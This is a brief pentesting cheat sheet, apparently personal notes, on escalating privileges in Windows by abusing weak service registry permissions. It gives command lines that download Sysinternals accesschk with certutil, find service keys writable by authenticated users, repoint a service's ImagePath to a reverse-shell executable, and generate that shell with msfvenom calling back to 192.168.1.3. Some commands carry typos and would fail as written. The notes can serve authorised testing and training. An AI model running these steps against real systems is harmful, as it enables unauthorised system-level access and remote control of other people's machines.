# Service Exploits - Weak Registry Permissions

Windows Sysinternals can be found:
- https://docs.microsoft.com/en-us/sysinternals/downloads/
- https://live.sysinternals.com/ (better to download direclty)

		certutil -urlcache -f https://live.sysinternals.com/accesschk.exe accesschk.exe

Enumerate for weak registry permissions

`accesschk.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services`

The registry showing `KEY_ALL_ACCESS` is vulnerable

Query the registry to see its path by typing 

`reg query <Registry`

Example

`reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pentest`

Change the path of the registry to the reverse shell

`reg add "HKLM\system\currentcontrolset\services\pentest" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Public\shell.exe" /f`


Reminder: Generating a reverse shell

`msfvenom –p window/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe > shell.exe`